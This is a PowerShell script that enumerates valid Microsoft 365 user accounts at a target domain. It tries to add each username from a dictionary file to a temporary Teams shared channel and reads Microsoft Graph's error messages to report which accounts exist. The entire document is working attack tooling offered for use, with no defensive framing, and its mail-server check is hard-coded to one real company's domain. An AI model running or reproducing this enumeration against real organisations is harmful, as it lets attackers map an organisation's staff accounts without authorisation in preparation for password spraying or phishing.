Param([Parameter(Mandatory=$true,ValueFromPipeline=$true,Position=0)][string]$domain
,[Parameter(Mandatory=$false,ValueFromPipeline=$true,Position=1)][string]$dictionary="dictionary.txt",
[Parameter(Mandatory=$false,ValueFromPipeline=$true,Position=2)][string]$team="xTapTeamxTap",
[Parameter(Mandatory=$false,ValueFromPipeline=$true,Position=3)][string]$channel="xTapChannelxTap")

if (-not(Test-Path -Path .\$dictionary -PathType Leaf))
	{
		Write-Output "Dictionary file not found"
		exit
	}
$mx=Resolve-DnsName -Name solarpack.es -Type MX | select NameExchange|select NameExchange -ExpandProperty NameExchange
if (-not($mx -Match ("mail.protection.outlook.com")))
	{
		Write-Output "Domain not at o365"
		exit
	}

$file_dict = Get-Content .\$dictionary


Import-Module MicrosoftTeams
Import-Module Microsoft.Graph.Teams

Write-Output "Creating team/channel"
Connect-MicrosoftTeams
Connect-MgGraph -Scopes "ChannelMember.ReadWrite.All"

$group = New-Team -MailNickname $team -displayname $team -Visibility "private"
Start-Sleep -Seconds 2
New-TeamChannel -GroupId $group.GroupId -DisplayName $channel -MembershipType "Shared"
$channelId=Get-TeamChannel -GroupId $group.GroupId -MembershipType Shared | Select Id -ExpandProperty Id
Write-Output "Check users"
 foreach($line in $file_dict)
{
	$params = @{
	 "@odata.type" = "#microsoft.graph.aadUserConversationMember"
	 Roles = @(
	 )
	 "User@odata.bind" = "https://graph.microsoft.com/beta/users('$line@$domain')"
	 }
	
	$response=$($output=&New-MgTeamChannelMember -TeamId $group.GroupId -ChannelId $channelId -BodyParameter $params) 2>&1
		
	if ($response -Match "User is not allowed to be added due to xTap.")
	{
		Write-Output "UserExist: $line@$domain"
	}
	 
	
 }
Write-Output "Deleting team/channel" 
 Remove-TeamChannel -GroupId $group.GroupId -DisplayName $channel
 Start-Sleep -Seconds 2
 Remove-Team -GroupId $group.GroupId